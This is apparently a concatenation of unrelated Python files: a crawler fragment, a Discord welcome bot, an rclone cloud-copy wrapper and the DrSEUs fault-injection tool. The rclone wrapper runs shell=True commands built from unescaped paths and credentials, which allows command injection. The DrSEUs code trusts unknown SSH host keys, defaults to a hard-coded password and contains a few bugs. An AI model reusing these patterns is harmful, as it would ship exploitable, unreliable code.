                        if not os.path.exists (destpath):
                            # create the directory, so templates like
                            # /{host}/{date}/… are possible
                            os.makedirs (os.path.dirname (destpath), exist_ok=True)
                            os.rename (dest.name, destpath)
                            break
                else:
                    # atomically (in the context of this process) append to
                    # existing file
                    async with self.copyLock:
                        with open (dest.name, 'rb') as infd, \
                                open (self.output, 'ab') as outfd:
                            shutil.copyfileobj (infd, outfd)
                        os.unlink (dest.name)
            else:
                self.stats['crashed'] += 1
                logStats ()

    async def run (self):
        def log ():
            # self.have includes running jobs
            self.logger.info ('recursing',
                    uuid='5b8498e4-868d-413c-a67e-004516b8452c',
                    pending=len (self.pending),
                    have=len (self.have)-len(self.running),
                    running=len (self.running))

        seqnum = 1
        try:
            self.have = set ()
            self.pending = set ([SetEntry (self.url, depth=0)])

            while self.pending:
                # since pending is a set this picks a random item, which is fine
                u = self.pending.pop ()
                self.have.add (u)
                t = asyncio.ensure_future (self.fetch (u, seqnum))
                self.running.add (t)
                seqnum += 1

                log ()

                if len (self.running) >= self.concurrency or not self.pending:
                    done, pending = await asyncio.wait (self.running,
                            return_when=asyncio.FIRST_COMPLETED)
                    self.running.difference_update (done)
                    # propagate exceptions
                    for r in done:
                        r.result ()
        except asyncio.CancelledError:
            self.logger.info ('cancel',
                    uuid='d58154c8-ec27-40f2-ab9e-e25c1b21cd88',
                    pending=len (self.pending),
                    have=len (self.have)-len (self.running),
                    running=len (self.running))
        finally:
            done = await asyncio.gather (*self.running,
                    return_exceptions=True)
            # propagate exceptions
            for r in done:
                if isinstance (r, Exception):
                    raise r
            self.running = set ()
            log ()


from discord_service import DiscordService
from welcome_message import WelcomeMessage
from discord_mention_factory import DiscordMentionFactory
from user_leave_notification import UserLeaveNotification

from dependency_injection import Dependencies
import json

def readJsonFile(file_name):
    with open(file_name, mode="r") as f:
        return json.load(f)

def read_secrets():
    return readJsonFile("secrets.json")

def read_config():
    return readJsonFile("config.json")

def setup_dependency_injection(config):
    return Dependencies(config)

if __name__ == "__main__":
    config = read_config()
    secrets = read_secrets()
    discord_token = secrets["discord-bot-token"]

    services = setup_dependency_injection(config)

    if config["welcome_message"]["enabled"]:
        services.welcome_message()

    if config["user_leave_notification"]["enabled"]:
        services.user_leave_notification()

    discord_service = services.discord_service()                    
    discord_service.run(discord_token)                    




    

import discord

class DiscordService(discord.Client):
    def __init__(self):
        super().__init__()
        self.on_member_join_callbacks = []
        self.on_member_remove_callbacks = []

    async def on_member_join(self, member):
        for callback in self.on_member_join_callbacks:
            await callback(member)

    async def on_member_remove(self, member):
        for callback in self.on_member_remove_callbacks:
            await callback(member)

    async def send_channel_message(self, message, channel_name):
        channels = self.get_all_channels()
        channel = [x for x in channels if x.name == channel_name][0]
        await channel.send(message)

    def get_matching_Member(self, username, discriminator):
        all_members = self.get_all_members()

        matching_member = [x for x in all_members if x.name == username and x.discriminator == discriminator][0]
        return matching_member

    def get_matching_role(self, role_name):
        all_roles = self.guilds[0].roles
        return [x for x in all_roles if x.name == role_name][0]                    

from collections import defaultdict
import functools
import json
import logging
import re
import subprocess
import threading
import time

class RcloneConnection:
    def __init__(self):
        self._job_status = defaultdict(functools.partial(defaultdict, str)) # Mapping from id to status dict

        self._job_text = defaultdict(str)
        self._job_error_text = defaultdict(str)
        self._job_percent = defaultdict(int)
        self._job_exitstatus = {}

        self._stop_events = {} # Mapping from id to threading.Event
        self._latest_job_id = 0


    def verify(self, data):
        credentials = self._formatCredentials(data, name='current')
        command = '{} rclone lsjson current:'.format(credentials)                    

        try:
            result = self._execute(command)                    
            return {
                'result': True,
                'message': 'Success',
            }
        except subprocess.CalledProcessError as e:
            returncode = e.returncode
            return {
                'result': False,
                'message': 'Exit status {}'.format(returncode),
            }


    def ls(self, data, path):
        credentials = self._formatCredentials(data, name='current')

        command = (                    
            '{credentials} '                    
            'rclone lsjson current:{path}'
        ).format(                    
            credentials=credentials,                    
            path=path,                    
        )

        try:
            result = self._execute(command)                    
            result = json.loads(result)
            return result
        except subprocess.CalledProcessError as e:
            raise RcloneException(sanitize(str(e)))




    def mkdir(self, data, path):
        credentials = self._formatCredentials(data, name='current')

        command = (                    
            '{credentials} '                    
            'rclone touch current:{path}/.keep'
        ).format(                    
            credentials=credentials,                    
            path=path,                    
        )

        try:
            result = self._execute(command)                    
            return {
                'message': 'Success',
            }
        except subprocess.CalledProcessError as e:
            raise RcloneException(sanitize(str(e)))



    def copy(self, src_data, src_path, dst_data, dst_path, job_id=None):
        credentials = ''                    

        if src_data is None: # Local
            src = src_path
        else:
            credentials += self._formatCredentials(src_data, name='src')                    
            src = 'src:{}'.format(src_path)

        if dst_data is None: # Local
            dst = dst_path
        else:
            credentials += self._formatCredentials(dst_data, name='dst')                    
            dst = 'dst:{}'.format(dst_path)


        command = (                    
            '{credentials} '                    
            'rclone copy {src} {dst} '
            '--progress '
            '--stats 2s '
        ).format(                    
            credentials=credentials,                    
            src=src,                    
            dst=dst,                    
        )

        logging.info(sanitize(command))                    

        if job_id is None:
            job_id = self._get_next_job_id()
        else:
            if self._job_id_exists(job_id):
                raise ValueError('rclone copy job with ID {} already exists'.fromat(job_id))

        self._stop_events[job_id] = threading.Event()

        try:
            self._execute_interactive(command, job_id)                    
        except subprocess.CalledProcessError as e:
            raise RcloneException(sanitize(str(e)))

        return job_id


    def copy_text(self, job_id):
        return self._job_text[job_id]

    def copy_error_text(self, job_id):
        return self._job_error_text[job_id]

    def copy_percent(self, job_id):
        return self._job_percent[job_id]

    def copy_stop(self, job_id):
        self._stop_events[job_id].set()

    def copy_finished(self, job_id):
        return self._stop_events[job_id].is_set()

    def copy_exitstatus(self, job_id):
        return self._job_exitstatus.get(job_id, -1)


    def _formatCredentials(self, data, name):
        """
        Credentials are of the form
        RCLONE_CONFIG_CURRENT_TYPE=s3
            ^          ^        ^   ^
        [mandatory  ][name  ][key][value]
        """

        prefix = "RCLONE_CONFIG_{}".format(name.upper())

        credentials = ''                    
        credentials += "{}_TYPE='{}' ".format(prefix, data.type)                    

        def _addCredential(credentials, env_key, data_key):
            value = getattr(data, data_key, None)
            if value is not None:
                credentials += "{}='{}' ".format(env_key, value)                    
            return credentials


        if data.type == 's3':
            credentials = _addCredential(credentials,
                '{}_REGION'.format(prefix),
                's3_region'
            )
            credentials = _addCredential(credentials,
                '{}_ACCESS_KEY_ID'.format(prefix),
                's3_access_key_id'
            )
            credentials = _addCredential(credentials,
                '{}_SECRET_ACCESS_KEY'.format(prefix),
                's3_secret_access_key'
            )

            credentials = _addCredential(credentials,
                '{}_ENDPOINT'.format(prefix),
                's3_endpoint'
            )
            credentials = _addCredential(credentials,
                '{}_V2_AUTH'.format(prefix),
                's3_v2_auth'
            )

        elif data.type == 'azureblob':
            credentials = _addCredential(credentials,
                '{}_ACCOUNT'.format(prefix),
                'azure_account'
            )
            credentials = _addCredential(credentials,
                '{}_KEY'.format(prefix),
                'azure_key'
            )

        elif data.type == 'swift':
            credentials = _addCredential(credentials,
                '{}_USER'.format(prefix),
                'swift_user'
            )
            credentials = _addCredential(credentials,
                '{}_KEY'.format(prefix),
                'swift_key'
            )
            credentials = _addCredential(credentials,
                '{}_AUTH'.format(prefix),
                'swift_auth'
            )
            credentials = _addCredential(credentials,
                '{}_TENANT'.format(prefix),
                'swift_tenant'
            )

        elif data.type == 'google cloud storage':
            credentials = _addCredential(credentials,
                '{}_CLIENT_ID'.format(prefix),
                'gcp_client_id'
            )
            credentials = _addCredential(credentials,
                '{}_SERVICE_ACCOUNT_CREDENTIALS'.format(prefix),
                'gcp_service_account_credentials'
            )
            credentials = _addCredential(credentials,
                '{}_PROJECT_NUMBER'.format(prefix),
                'gcp_project_number'
            )
            credentials = _addCredential(credentials,
                '{}_OBJECT_ACL'.format(prefix),
                'gcp_object_acl'
            )
            credentials = _addCredential(credentials,
                '{}_BUCKET_ACL'.format(prefix),
                'gcp_bucket_acl'
            )

        else:
            logging.error("Connection type unknown: {}".format(data.type))

        return credentials


    def _get_next_job_id(self):
        self._latest_job_id += 1
        while self._job_id_exists(self._latest_job_id):
            self._latest_job_id += 1
        return self._latest_job_id

    def _job_id_exists(self, job_id):
        return job_id in self._job_status


    def _execute(self, command):                    
        byteOutput = subprocess.check_output(command, shell=True)                    
        output = byteOutput.decode('UTF-8').rstrip()
        return output


    def _execute_interactive(self, command, job_id):                    
        thread = threading.Thread(target=self.__execute_interactive, kwargs={
            'command': command,
            'job_id': job_id,
        })
        thread.daemon = True
        thread.start()


    def __execute_interactive(self, command, job_id):                    
        stop_event = self._stop_events[job_id]

        process = subprocess.Popen(
            command,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,                    
        )

        reset_sequence1 = '\x1b[2K\x1b[0' # + 'G'
        reset_sequence2 = '\x1b[2K\x1b[A\x1b[2K\x1b[A\x1b[2K\x1b[A\x1b[2K\x1b[A\x1b[2K\x1b[A\x1b[2K\x1b[A\x1b[2K\x1b[0' # + 'G'

        while not stop_event.is_set():
            line = process.stdout.readline().decode('utf-8')

            if len(line) == 0:
                if process.poll() is not None:
                    stop_event.set()
                else:
                    time.sleep(0.5)
                continue

            line = line.strip()

            q1 = line.find(reset_sequence1)
            if q1 != -1:
                line = line[q1 + len(reset_sequence1):]

            q2 = line.find(reset_sequence2)
            if q2 != -1:
                line = line[q2 + len(reset_sequence1):]

            line = line.replace(reset_sequence1, '')
            line = line.replace(reset_sequence2, '')

            match = re.search(r'(ERROR.*)', line)
            if match is not None:
                error = match.groups()[0]
                logging.error(error)
                self._job_error_text[job_id] += error
                self._job_error_text[job_id] += '\n'
                continue

            match = re.search(r'([A-Za-z ]+):\s*(.*)', line)
            if match is None:
                logging.info("No match in {}".format(line))
                time.sleep(0.5)
                continue

            key, value = match.groups()
            self._job_status[job_id][key] = value
            self.__process_status(job_id)

        self._job_percent[job_id] = 100
        self.__process_status(job_id)

        exitstatus = process.poll()
        self._job_exitstatus[job_id] = exitstatus

        for _ in range(1000):
            line = process.stderr.readline().decode('utf-8')
            if len(line) == 0:
                break
            line = line.strip()
            self._job_error_text[job_id] += line
            self._job_error_text[job_id] += '\n'

        logging.info("Copy process exited with exit status {}".format(exitstatus))
        stop_event.set() # Just in case


    def __process_status(self, job_id):
        self.__process_text(job_id)
        self.__process_percent(job_id)


    def __process_text(self, job_id):
        headers = [
            'GTransferred',
            'Errors',
            'Checks',
            'Transferred',
            'Elapsed time',
            'Transferring',
        ]

        status = self._job_status[job_id]

        text = '\n'.join(
            '{:>12}: {}'.format(header, status[header])
            for header in headers
        )
        self._job_text[job_id] = text


    def __process_percent(self, job_id):
        status = self._job_status[job_id]

        match = re.search(r'(\d+)\%', status['GTransferred'])
        if match is None:
            self._job_percent[job_id] = -1
        else:
            self._job_percent[job_id] = match[1]



def sanitize(string):
    sanitizations_regs = [
        # s3
        (r"(RCLONE_CONFIG_\S*_ACCESS_KEY_ID=')(\S*)(\S\S\S\S')", r"\1***\3"),
        (r"(RCLONE_CONFIG_\S*_SECRET_ACCESS_KEY=')(\S*)(')", r"\1***\3"),

        # Azure
        (r"(RCLONE_CONFIG_\S*_KEY=')(\S*)(')", r"\1***\3"),

        # Swift
        (r"(RCLONE_CONFIG_\S*_KEY=')(\S*)(')", r"\1***\3"),

        # GCP
        (r"(RCLONE_CONFIG_\S*_CLIENT_ID=')(\S*)(\S\S\S\S')", r"\1***\3"),
        (r"(RCLONE_CONFIG_\S*_SERVICE_ACCOUNT_CREDENTIALS=')([^']*)(')", r"\1{***}\3"),
    ]

    for regex, replace in sanitizations_regs:
        string = re.sub(regex, replace, string)

    return string



class RcloneException(Exception):
    pass


def main():
    import time
    import os

    class CloudConnection:
        pass

    data = CloudConnection()
    data.__dict__ = {
        'type': 's3',
        'region': os.environ['MOTUZ_REGION'],
        'access_key_id': os.environ['MOTUZ_ACCESS_KEY_ID'],
        'secret_access_key': os.environ['MOTUZ_SECRET_ACCESS_KEY'],
    }

    connection = RcloneConnection()

    # result = connection.ls('/fh-ctr-mofuz-test/hello/world')
    job_id = 123
    import random
    connection.copy(
        src_data=None, # Local
        src_path='/tmp/motuz/mb_blob.bin',
        dst_data=data,
        dst_path='/fh-ctr-mofuz-test/hello/world/{}'.format(random.randint(10, 10000)),
        job_id=job_id
    )


    while not connection.copy_finished(job_id):
        print(connection.copy_percent(job_id))
        time.sleep(0.1)



if __name__ == '__main__':
    main()


#!/usr/bin/env python3
from argparse import ArgumentParser

import utilities

# TODO: add option for device password
# TODO: add options for custom error messages
# TODO: use formatting strings
# TODO: add ip address override
# TODO: remove output image buttons if not needed from log viewer result page
# TODO: move rsakey back into campaign_data/db
# TODO: add boot commands option
# TODO: add modes to backup database and delete backups
# TODO: add mode to redo injection iteration
# TODO: add fallback to power cycle when resetting dut
# TODO: add support for injection of multi-bit upsets
# TODO: add option for number of times to rerun app for latent fault case
# TODO: change Exception in simics.py to DrSEUsError

parser = ArgumentParser(
    description='The Dynamic Robust Single Event Upset Simulator '
                'was created by Ed Carlisle IV',
    epilog='Begin by creating a new campaign with "%(prog)s new APPLICATION". '
           'Then run injections with "%(prog)s inject".')
parser.add_argument('-C', '--campaign', action='store', type=int, metavar='ID',
                    dest='campaign_id', default=0,
                    help='campaign to use, defaults to last campaign created')
parser.add_argument('-D', '--debug', action='store_true', dest='debug',
                    help='display device output for parallel injections')
parser.add_argument('-T', '--timeout', action='store', type=int,
                    metavar='SECONDS', dest='timeout', default=300,
                    help='device read timeout [default=300]')
parser.add_argument('--serial', action='store', metavar='PORT',
                    dest='dut_serial_port',
                    help='DUT serial port [p2020 default=/dev/ttyUSB1] '
                         '[a9 default=/dev/ttyACM0] (overridden by Simics)')
parser.add_argument('--baud', action='store', type=int, metavar='RATE',
                    dest='dut_baud_rate', default=115200,
                    help='DUT serial port baud rate [default=115200]')
parser.add_argument('--scp', action='store', type=int, metavar='PORT',
                    dest='dut_scp_port', default=22,
                    help='DUT scp port [default=22] (overridden by Simics)')
parser.add_argument('--prompt', action='store', metavar='PROMPT',
                    dest='dut_prompt',
                    help='DUT console prompt [p2020 default=root@p2020rdb:~#] '
                         '[a9 default=[root@ZED]#] (overridden by Simics)')
parser.add_argument('--user', action='store', dest='username', default='root',
                    help='device username')
parser.add_argument('--pass', action='store', dest='password', default='chrec',
                    help='device password')
parser.add_argument('--uboot', action='store', metavar='COMMAND',
                    dest='dut_uboot', default='', help='DUT u-boot command')
parser.add_argument('--aux_serial', action='store', metavar='PORT',
                    dest='aux_serial_port',
                    help='AUX serial port [p2020 default=/dev/ttyUSB1] '
                         '[a9 default=/dev/ttyACM0] (overridden by Simics)')
parser.add_argument('--aux_baud', action='store', type=int, metavar='RATE',
                    dest='aux_baud_rate', default=115200,
                    help='AUX serial port baud rate [default=115200]')
parser.add_argument('--aux_scp', action='store', type=int, metavar='PORT',
                    dest='aux_scp_port', default=22,
                    help='AUX scp port [default=22] (overridden by Simics)')
parser.add_argument('--aux_prompt', action='store', metavar='PROMPT',
                    dest='aux_prompt',
                    help='AUX console prompt [p2020 default=root@p2020rdb:~#] '
                         '[a9 default=[root@ZED]#] (overridden by Simics)')
parser.add_argument('--aux_uboot', action='store', metavar='COMMAND',
                    dest='aux_uboot', default='', help='AUX u-boot command')
parser.add_argument('--debugger_ip', action='store', metavar='ADDRESS',
                    dest='debugger_ip_address', default='10.42.0.50',
                    help='debugger ip address [default=10.42.0.50] '
                         '(ignored by Simics and ZedBoards)')
parser.add_argument('--no_jtag', action='store_false', dest='jtag',
                    help='do not connect to jtag debugger (ignored by Simics)')
subparsers = parser.add_subparsers(
    title='commands',
    description='Run "%(prog)s COMMAND -h" to get additional help for each '
                'command',
    metavar='COMMAND', dest='command')

new_campaign = subparsers.add_parser('new', aliases=['n'],
                                     help='create a new campaign',
                                     description='create a new campaign')
new_campaign.add_argument('application', action='store', metavar='APPLICATION',
                          help='application to run on device')
new_campaign.add_argument('-A', '--arch', action='store',
                          choices=('a9', 'p2020'), dest='architecture',                    
                          default='p2020',
                          help='target architecture [default=p2020]')
new_campaign.add_argument('-t', '--timing', action='store', type=int,
                          dest='iterations', default=5,
                          help='number of timing iterations to run [default=5]')
new_campaign.add_argument('-a', '--args', action='store', nargs='+',
                          dest='arguments', help='arguments for application')
new_campaign.add_argument('-d', '--dir', action='store', dest='directory',
                          default='fiapps',
                          help='directory to look for files [default=fiapps]')
new_campaign.add_argument('-f', '--files', action='store', nargs='+',
                          metavar='FILE', dest='files',
                          help='files to copy to device')
new_campaign.add_argument('-o', '--output', action='store', dest='file',
                          default='result.dat',
                          help='target application output file '
                               '[default=result.dat]')
new_campaign.add_argument('-x', '--aux', action='store_true', dest='use_aux',
                          help='use auxiliary device during testing')
new_campaign.add_argument('-y', '--aux_app', action='store',
                          metavar='APPLICATION', dest='aux_application',
                          help='target application for auxiliary device')
new_campaign.add_argument('-z', '--aux_args', action='store',
                          metavar='ARGUMENTS', dest='aux_arguments',
                          help='arguments for auxiliary application')
new_campaign.add_argument('-F', '--aux_files', action='store', nargs='+',
                          metavar='FILE', dest='aux_files',
                          help='files to copy to auxiliary device')
new_campaign.add_argument('-O', '--aux_output', action='store_true',
                          dest='use_aux_output',
                          help='use output file from auxiliary device')
new_campaign.add_argument('-k', '--kill_dut', action='store_true',
                          dest='kill_dut',
                          help='send ctrl-c to DUT after auxiliary device '
                               'completes execution')
new_campaign.add_argument('-s', '--simics', action='store_true',
                          dest='use_simics', help='use Simics simulator')
new_simics_campaign = new_campaign.add_argument_group(
    'Simics campaigns', 'Additional options for Simics campaigns only')
new_simics_campaign.add_argument('-c', '--checkpoints', action='store',
                                 type=int, metavar='CHECKPOINTS',
                                 dest='checkpoints', default=50,
                                 help='number of gold checkpoints to target for'
                                      ' creation (actual number of checkpoints '
                                      'may be different) [default=50]')
new_campaign.set_defaults(func=utilities.create_campaign)

inject = subparsers.add_parser('inject', aliases=['i', 'I', 'inj'],
                               help='perform fault injections on a campaign',
                               description='perform fault injections on a '
                                           'campaign')
inject.add_argument('-n', '--iterations', action='store', type=int,
                    dest='iterations',
                    help='number of iterations to perform [default=infinite]')
inject.add_argument('-i', '--injections', action='store', type=int,
                    dest='injections', default=1,
                    help='number of injections per iteration [default=1]')
inject.add_argument('-t', '--targets', action='store', nargs='+',
                    metavar='TARGET', dest='selected_targets',
                    help='list of targets for injection')
inject.add_argument('-p', '--processes', action='store', type=int,
                    dest='processes', default=1,
                    help='number of injections to perform in parallel '
                         '(only supported for ZedBoards and Simics)')
inject_simics = inject.add_argument_group(
    'Simics campaigns', 'Additional options for Simics campaigns only')
inject_simics.add_argument('-a', '--compare_all', action='store_true',
                           dest='compare_all',
                           help='monitor all checkpoints (only last by '
                                'default), IMPORTANT: do NOT use with '
                                '"-p" or "--processes" when using this '
                                'option for the first time in a '
                                'campaign')
inject.set_defaults(func=utilities.inject_campaign)

supervise = subparsers.add_parser('supervise', aliases=['s', 'S'],
                                  help='run interactive supervisor',
                                  description='run interactive supervisor')
supervise.add_argument('-w', '--wireshark', action='store_true', dest='capture',
                       help='run remote packet capture')
supervise.set_defaults(func=utilities.launch_supervisor)

log_viewer = subparsers.add_parser('log', aliases=['l'],
                                   help='start the log web server',
                                   description='start the log web server')
log_viewer.add_argument('-p', '--port', action='store', type=int,
                        dest='port', default=8000,
                        help='log web server port [default=8000]')
log_viewer.set_defaults(func=utilities.view_logs)

zedboards = subparsers.add_parser('zedboards', aliases=['z', 'Z'],
                                  help='print information about attached '
                                       'ZedBoards',
                                  description='print information about '
                                              'attached ZedBoards')
zedboards.set_defaults(func=utilities.print_zedboard_info)

list_campaigns = subparsers.add_parser('list', aliases=['L', 'ls'],
                                       help='list campaigns',
                                       description='list campaigns')
list_campaigns.set_defaults(func=utilities.list_campaigns)

delete = subparsers.add_parser('delete', aliases=['d', 'D'],
                               description='delete results and campaigns',
                               help='delete results and campaigns')
delete.add_argument('delete', action='store',
                    choices=('all', 'results', 'campaign'),                    
                    help='delete {results} for the selected campaign, '                    
                         'delete selected {campaign} and its results, '
                         'or delete {all} campaigns and results')
delete.set_defaults(func=utilities.delete)

merge = subparsers.add_parser('merge', aliases=['m', 'M'],
                              help='merge campaigns',
                              description='merge campaigns')
merge.add_argument('directory', action='store', metavar='DIRECTORY',
                   help='merge campaigns from external directory into the '
                        'local directory')
merge.set_defaults(func=utilities.merge_campaigns)

openocd = subparsers.add_parser('openocd', aliases=['o', 'O'],
                                help='launch openocd for DUT '
                                     '(only supported for ZedBoards)',
                                description='launch openocd for DUT '
                                            '(only supported for ZedBoards)')
openocd.set_defaults(func=utilities.launch_openocd)

regenerate = subparsers.add_parser('regenerate', aliases=['r', 'R'],
                                   help='regenerate injected state and launch '
                                        'in Simics (only supported for Simics '
                                        'campaigns)',
                                   description='regenerate injected state and '
                                               'launch in Simics (only '
                                               'supported for Simics '
                                               'campaigns)')
regenerate.add_argument('result_id', action='store', metavar='RESULT_ID',
                        help='result to regenerate')
regenerate.set_defaults(func=utilities.regenerate)

update = subparsers.add_parser('update', aliases=['u', 'U'],
                               help='update gold checkpoint dependency paths '
                                    '(only supported for Simics campaigns)',
                               description='update gold checkpoint dependency '
                                           'paths (only supported for Simics '
                                           'campaigns)')
update.set_defaults(func=utilities.update_dependencies)

backup = subparsers.add_parser('backup', aliases=['b', 'B'],
                               help='backup the results database',
                               description='backup the results database')
backup.set_defaults(func=utilities.backup_database)

options = parser.parse_args()
if options.command is None:
    parser.print_help()
else:
    if options.command != 'new':
        if not options.campaign_id:
            options.campaign_id = utilities.get_last_campaign()
        if options.campaign_id:
            options.architecture = \
                utilities.get_campaign_data(options.campaign_id)['architecture']
    if options.command == 'new' or options.campaign_id:
        if options.architecture == 'p2020':
            if options.dut_serial_port is None:
                options.dut_serial_port = '/dev/ttyUSB1'
            if options.dut_prompt is None:
                options.dut_prompt = 'root@p2020rdb:~#'
            if options.aux_serial_port is None:
                options.aux_serial_port = '/dev/ttyUSB0'
            if options.aux_prompt is None:
                options.aux_prompt = 'root@p2020rdb:~#'
        elif options.architecture == 'a9':
            if options.dut_serial_port is None:
                options.dut_serial_port = '/dev/ttyACM0'
            if options.dut_prompt is None:
                options.dut_prompt = '[root@ZED]#'
            if options.aux_serial_port is None:
                options.aux_serial_port = '/dev/ttyACM1'
            if options.aux_prompt is None:
                options.aux_prompt = '[root@ZED]#'
    if options.command == 'new' and options.arguments:
        options.arguments = ' '.join(options.arguments)
    options.func(options)

from paramiko import AutoAddPolicy, SSHClient
from scp import SCPClient
from serial import Serial
import sys
from termcolor import colored
from time import sleep

from error import DrSEUsError
from sql import sql


class dut(object):
    error_messages = [
        ('drseus_sighandler: SIGSEGV', 'Signal SIGSEGV'),
        ('drseus_sighandler: SIGILL', 'Signal SIGILL'),
        ('drseus_sighandler: SIGBUS', 'Signal SIGBUS'),
        ('drseus_sighandler: SIGFPE', 'Signal SIGFPE'),
        ('drseus_sighandler: SIGABRT', 'Signal SIGABRT'),
        ('drseus_sighandler: SIGIOT', 'Signal SIGIOT'),
        ('drseus_sighandler: SIGTRAP', 'Signal SIGTRAP'),
        ('drseus_sighandler: SIGSYS', 'Signal SIGSYS'),
        ('drseus_sighandler: SIGEMT', 'Signal SIGEMT'),
        ('command not found', 'Invalid command'),
        ('No such file or directory', 'Missing file'),
        ('panic', 'Kernel error'),
        ('Oops', 'Kernel error'),
        ('Segmentation fault', 'Segmentation fault'),
        ('Illegal instruction', 'Illegal instruction'),
        ('Call Trace:', 'Kernel error'),
        ('detected stalls on CPU', 'Stall detected'),
        ('malloc(), memory corruption', 'Kernel error'),
        ('Bad swap file entry', 'Kernel error'),
        ('Unable to handle kernel paging request', 'Kernel error'),
        ('Alignment trap', 'Kernel error'),
        ('Unhandled fault', 'Kernel error'),
        ('free(), invalid next size', 'Kernel error'),
        ('double free or corruption', 'Kernel error'),
        ('????????', '????????'),
        ('Hit any key to stop autoboot:', 'Reboot'),
        ('can\'t get kernel image', 'Error booting')]

    def __init__(self, campaign_data, result_data, options, rsakey, aux=False):
        self.campaign_data = campaign_data
        self.result_data = result_data
        self.options = options
        self.aux = aux
        self.uboot_command = self.options.dut_uboot if not self.aux \
            else self.options.aux_uboot
        serial_port = (options.dut_serial_port if not aux
                       else options.aux_serial_port)
        baud_rate = (options.dut_baud_rate if not aux
                     else options.aux_baud_rate)
        self.serial = Serial(port=None, baudrate=baud_rate,
                             timeout=options.timeout, rtscts=True)
        if self.campaign_data['use_simics']:
            # workaround for pyserial 3
            self.serial._dsrdtr = True
        self.serial.port = serial_port
        self.serial.open()
        self.serial.reset_input_buffer()
        self.prompt = options.dut_prompt if not aux else options.aux_prompt
        self.prompt += ' '
        self.rsakey = rsakey

    def __str__(self):
        string = ('Serial Port: '+self.serial.port+'\n\tTimeout: ' +
                  str(self.serial.timeout)+' seconds\n\tPrompt: \"' +
                  self.prompt+'\"')
        try:
            string += '\n\tIP Address: '+self.ip_address
        except AttributeError:
            pass
        string += '\n\tSCP Port: '+str(self.options.dut_scp_port if not self.aux
                                       else self.options.aux_scp_port)
        return string

    def close(self):
        self.serial.close()

    def send_files(self, files, attempts=10):
        if self.options.debug:
            print(colored('sending file(s)...', 'blue'), end='')
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        for attempt in range(attempts):
            try:
                ssh.connect(self.ip_address, port=(self.options.dut_scp_port
                                                   if not self.aux else
                                                   self.options.aux_scp_port),
                            username='root', pkey=self.rsakey,
                            allow_agent=False, look_for_keys=False)
            except Exception as error:
                if self.options.command != 'new':
                    with sql() as db:
                        db.log_event_exception(                                        
                            self.result_data['id'],
                            ('DUT' if not self.aux else 'AUX'),                    
                            'SSH error')                    
                print(colored(
                    self.serial.port+' '+str(self.result_data['id'])+': '                                        
                    'error sending file(s) (attempt '+str(attempt+1)+'/' +
                    str(attempts)+'): '+str(error), 'red'))
                if attempt < attempts-1:
                    sleep(30)
                else:
                    raise DrSEUsError(DrSEUsError.ssh_error)
            else:
                dut_scp = SCPClient(ssh.get_transport())
                try:
                    dut_scp.put(files)
                except Exception as error:
                    if self.options.command != 'new':
                        with sql() as db:
                            db.log_event_exception(                                        
                                self.result_data['id'],
                                ('DUT' if not self.aux else 'AUX'),                    
                                'SCP error')                    
                    print(colored(
                        self.serial.port+' '+str(self.result_data['id'])+': '                                        
                        'error sending file(s) (attempt '+str(attempt+1)+'/' +
                        str(attempts)+'): '+str(error), 'red'))
                    dut_scp.close()
                    ssh.close()
                    if attempt < attempts-1:
                        sleep(30)
                    else:
                        raise DrSEUsError(DrSEUsError.scp_error)
                else:
                    dut_scp.close()
                    ssh.close()
                    if self.options.debug:
                        print(colored('done', 'blue'))
                    break

    def get_file(self, file_, local_path='', attempts=10):
        if self.options.debug:
            print(colored('getting file...', 'blue'), end='')
            sys.stdout.flush()
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        for attempt in range(attempts):
            try:
                ssh.connect(self.ip_address, port=(self.options.dut_scp_port
                                                   if not self.aux else
                                                   self.options.aux_scp_port),
                            username='root', pkey=self.rsakey,
                            allow_agent=False, look_for_keys=False)
            except Exception as error:
                if self.options.command != 'new':
                    with sql() as db:
                        db.log_event_exception(                                        
                            self.result_data['id'],
                            ('DUT' if not self.aux else 'AUX'),                    
                            'SSH error')                    
                print(colored(
                    self.serial.port+' '+str(self.result_data['id'])+': '                                        
                    'error receiving file (attempt '+str(attempt+1)+'/' +
                    str(attempts)+'): '+str(error), 'red'))
                if attempt < attempts-1:
                    sleep(30)
                else:
                    raise DrSEUsError(DrSEUsError.ssh_error)
            else:
                dut_scp = SCPClient(ssh.get_transport())
                try:
                    dut_scp.get(file_, local_path=local_path)
                except:                    
                    if self.options.command != 'new':
                        with sql() as db:
                            db.log_event_exception(                                        
                                self.result_data['id'],
                                ('DUT' if not self.aux else 'AUX'),                    
                                'SCP error')                    
                    print(colored(
                        self.serial.port+' '+str(self.result_data['id'])+': '                                        
                        'error receiving file (attempt '+str(attempt+1)+'/' +
                        str(attempts)+'): '+str(error), 'red'))
                    dut_scp.close()
                    ssh.close()
                    if attempt < attempts-1:
                        sleep(30)
                    else:
                        raise DrSEUsError(DrSEUsError.scp_error)
                else:
                    dut_scp.close()
                    ssh.close()
                    if self.options.debug:
                        print(colored('done', 'blue'))
                    break

    def write(self, string):
        self.serial.write(bytes(string, encoding='utf-8'))

    def read_until(self, string=None, continuous=False, boot=False):
        if string is None:
            string = self.prompt
        buff = ''
        event_buff = ''
        event_buff_logged = ''
        errors = 0
        while True:
            char = self.serial.read().decode('utf-8', 'replace')
            if not char:
                if self.options.command != 'new':
                    with sql() as db:
                        event_buff = buff.replace(event_buff_logged, '')                    
                        db.log_event(self.result_data['id'],                    
                                     ('DUT' if not self.aux else 'AUX'),                    
                                     'Read timeout', event_buff)                    
                        event_buff_logged += event_buff                    
                if not continuous:
                    break
            if self.options.command == 'new':
                self.campaign_data['dut_output' if not self.aux
                                   else 'aux_output'] += char
            else:
                self.result_data['dut_output' if not self.aux
                                 else 'aux_output'] += char
            if self.options.debug:
                print(colored(char, 'green' if not self.aux else 'cyan'),
                      end='')
                sys.stdout.flush()
            buff += char
            if not continuous and buff[-len(string):] == string:
                break
            elif buff[-len('autoboot: '):] == 'autoboot: ' and \
                    self.uboot_command:
                self.write('\n')
                self.write(self.uboot_command+'\n')
            elif buff[-len('login: '):] == 'login: ':
                self.write(self.options.username+'\n')
            elif buff[-len('Password: '):] == 'Password: ':
                self.write(self.options.password+'\n')
            elif buff[-len('can\'t get kernel image'):] == \
                    'can\'t get kernel image':
                self.write('reset\n')
                errors += 1
            for message, category in self.error_messages:
                if buff[-len(message):] == message:
                    if not continuous and not boot:
                        self.serial.timeout = 30
                        errors += 1
